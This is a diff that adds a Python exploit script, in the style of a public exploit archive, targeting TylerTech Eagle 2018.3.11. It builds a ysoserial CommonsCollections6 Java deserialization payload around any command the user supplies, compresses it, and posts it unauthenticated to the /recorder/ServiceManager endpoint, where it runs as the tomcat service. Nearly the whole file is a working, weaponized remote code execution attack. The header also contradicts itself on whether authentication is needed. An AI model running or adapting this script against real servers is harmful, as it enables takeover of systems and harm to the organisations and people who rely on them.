@@ -1,0 +1,57 @@
+# Exploit Title: TylerTech Eagle 2018.3.11 - Remote Code Execution
+# Date: 2019-10-08
+# Exploit Author: Anthony Cole
+# Vendor Homepage: https://www.tylertech.com/products/eagle
+# Version: 2018.3.11
+# Tested on: Windows 2012
+# CVE: N/A
+# Category: webapps
+#   
+# Eagle is a software written in Java by TylerTech.  Version 2018.3.11 allows an unauthenticated attacker to cause the software to deserialize untrusted data that can result in remote code execution.
+# /recorder/ServiceManager in TylerTech Eagle 2018.3.11 is vulnerable to remote code execution via deserialization of untrusted user input from an authenticated user. The executed code will run as the tomcat service that is running the application.
+#  
+
+
+import sys, requests, zlib, argparse, urlparse, subprocess
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+def run_command(command):
+	p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+	output = b''
+	for line in iter(p.stdout.readline, b''):
+		output += line
+		
+	return output
+
+def isurl(urlstr):
+	try:
+		urlparse.urlparse(urlstr)
+		return urlstr
+	except:
+		raise argparse.ArgumentTypeError("invalid url")
+
+if __name__ == "__main__":
+	parser = argparse.ArgumentParser(description='Java Deserialization Exlpoit')
+	parser.add_argument("--url", "-u", type=isurl, required=True, help="the url of the target.")
+	parser.add_argument("--cmd", "-c", required=True, help="the command to execute")
+	parser.add_argument("--ysoserial", "-y", required=True, help="the path to ysoserial.jar")
+	parser.add_argument("--proxy", "-p", type=isurl, required=False, help="ex: http://127.0.0.1:8080")
+	args = parser.parse_args()
+	
+	url_parts = urlparse.urlparse(args.url)
+	target_url = "%s://%s" % (url_parts.scheme, url_parts.netloc)
+	
+	proxies = {}
+	if(args.proxy != None):
+		proxy_parts = urlparse.urlparse(args.proxy)
+		proxies[proxy_parts.scheme] = "%s://%s" % (proxy_parts.scheme, proxy_parts.netloc)
+	
+	cmd = args.cmd
+	
+	serial_payload = run_command('java -jar %s CommonsCollections6 "%s"' % (args.ysoserial, args.cmd))
+	
+	url = target_url + "/recorder/ServiceManager?service=tyler.empire.settings.SettingManager"
+	headers = {'Content-Type': 'application/octet-stream'}
+	payload = zlib.compress(serial_payload)
+	response = requests.post(url, data=payload, proxies=proxies, verify=False)
